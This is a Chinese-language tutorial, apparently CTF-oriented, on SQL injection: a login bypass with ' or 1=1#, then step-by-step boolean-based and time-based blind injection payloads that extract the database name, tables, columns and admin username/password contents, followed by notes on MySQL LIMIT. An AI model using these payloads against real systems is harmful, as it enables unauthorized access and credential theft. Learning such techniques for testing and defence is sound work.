2、逻辑运算

（1）

Select * from admin where username=’admin’ and password=’admin’

可以用' or 1=1#作为密码输入

Select * from admin where username=’admin’ and password=’’or 1=1#’

（2）

Select * from users where id=1 and 1=1;
Select * from users where id=1 && 1=1;
Select * from users where id=1 & 1=1;

第一句和第二句是同一个意思，&&具有短路的功能，即如果第一个表达式为false，则不再计算第二个表达式

第三句&可以是逻辑运算也可以是位运算

3、SQL盲注

在SQL注入的过程中，选择的数据不能回显到前端页面

（1）基于布尔SQL盲注

true or false

截取字符串函数

mid(str,statr,length)   起始值1，长度可省略，返回剩余文本

mid((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>'a'

substr(str,start,length)
substring(str,start,length)

left(str,length)   字符串从左指定length个字符

left(database(),2)>'ab'

ord()   返回一个字符串的ASCLL码

ascii(substr((select database()),1,1))=98

基本流程：

1.判断注入点
and -1=-1  页面返回有数据
and -1=-2  页面无结果返回

2. 判断当前页面字段总数
and -1=-1 order by 2 页面返回有数据
and -1=-2 order by 3 页面无结果返回
当前页面字段数为：2。

3.判断显示位 
and -1=-2 union select 1,2 页面无结果返回
无回显点，应该是：盲注并且是布尔盲注（有明显的True和Flash）。

4.猜解当前数据库名称长度
and (length(database()))>11页面返回有数据
and (length(database()))>12页面无结果返回
当前数据库名称长度为：12。

5.用ASCII码猜解当前数据库名称
and ascii(substr(database(),1,1))=107 页面返回有数据
and ascii(substr(database(),2,1))=97 页面返回有数据
当前数据库 第一个字母是k,第二个字母是a...以此类推得到数据库库名是kanwolonxia。
注：判断ascii码范围不止是 ”=",还应该恰当使用 “>”,“<” 等符号。

6.猜表名
and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=108  页面返回有数据
表名的 第一个字母是 l ...然后以此类推得到 表名 loflag。

7.猜字段名 
and (ascii(substr((select column_name from information_schema.columns where table_name='loflag' limit 1,1),1,1)))=102   页面返回有数据
字段名的第一个字母是 f...类推得到字段名 flaglo。

8.猜内容 
and (ascii(substr(( select flaglo from loflag limit 0,1),1,1)))=122  页面返回有数据
得到数据的第一个字母是 z...类推得到数据zKaQ-QQQ

数据库长度

' or length(database()) > 8 --+ 符合条件返回正确，反之返回错误

数据库名

'or mid(database(),1,1)= 'z' --+    因为需要验证的字符太多，所以转化为ascii码验证
'or ORD(mid(database(),1,1)) > 100 --+ 通过确定ascii码，从而确定数据库名

表的数量

'or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2 --+ 判断表的总数

第一个表名的长度

'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+

'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表）

第一个表名

'or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1 ),1,1) = 'a'  --+

'Or ORD(mid(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1)) >100   --+

表的字段总数

'or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='表名') > 5 --+

第一个字段的长度

'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 0,1) = 10 --+

'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 10 --+ （第二个字段）

第一个字段名

'or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1) = 'i' --+

'or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1)) > 100 --+

直接猜字段名

' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 'username' --+

内容长度

假如已经知道字段名为  id username password
'or (select Length(concat(username,"---",password)) from admin limit 0,1) = 16  --+

内容

'or mid((select concat(username,"-----",password) from admin limit 0,1),1,1) = 'a' --+

'or ORD(mid((select concat(username,"-----",password) from admin limit 0,1),1,1)) > 100 --+    ASCII码猜解

直接猜内容

'or (Select concat(username,"-----",password) from admin limit 0,1 ) = 'admin-----123456' --+

（2）基于时间的SQL盲注

页面响应时间

常用函数

Sleep(time)                           :延迟函数
If(condition,true,false)          :条件语句
mid(str,start,length)             :字符串截取
ORD()                             :转换成ascii码
Length()                          :统计长度

注入思路：

1.判断注入点
"and -1=-1-- w  页面返回有数据
"and -1=-2-- w  页面返回有数据
页面的返回没有变化，可能是盲注；
然后用sleep()判断是否是时间盲注
"and sleep(5)-- w    页面延时了
该盲注是时间盲注。

2.猜解当前数据库名称长度
"and if((length(database()))=12,sleep(5),1)-- w  页面延时了
当前数据库名称长度为 12。

3.用ASCII码猜解当前数据库名称
"and if(ascii(substr(database(),1,1))=107,sleep(5),1)-- w  页面延时了
数据库第一个字母是k... 类推得到数据库名kanwolonxia。

之后同布尔盲注，只是多了个if()函数。

数据库总数

' and sleep(if((select count(SCHEMA_NAME) from information_schema.SCHEMATA)=7,0,5)) 
如果数据库总数等于7响应时间为0秒，如果不等于7 相应时间为5秒

数据库长度

' and sleep(if((length(database()) = 8),0,5))--+ 当前数据库名长度为8

数据库名

' and sleep(if((ORD(mid(database(),1,1)) =115 ),0,5))--+ ascii码115 就是s

4、limit用法

From：http://www.blogjava.net/yemen/articles/229521.html

（1）LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。

LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。

（2）初始记录行的偏移量是 0

（3）实例：

mysql> SELECT * FROM table LIMIT 5,10;  // 检索记录行 6-15

//为了检索从某一个偏移量到记录集的结束所有的记录行，可以指定第二个参数为 -1： 
mysql> SELECT * FROM table LIMIT 95,-1; // 检索记录行 96-last.

//如果只给定一个参数，它表示返回最大的记录行数目： 
mysql> SELECT * FROM table LIMIT 5;     //检索前 5 个记录行

//换句话说，LIMIT n 等价于 LIMIT 0,n
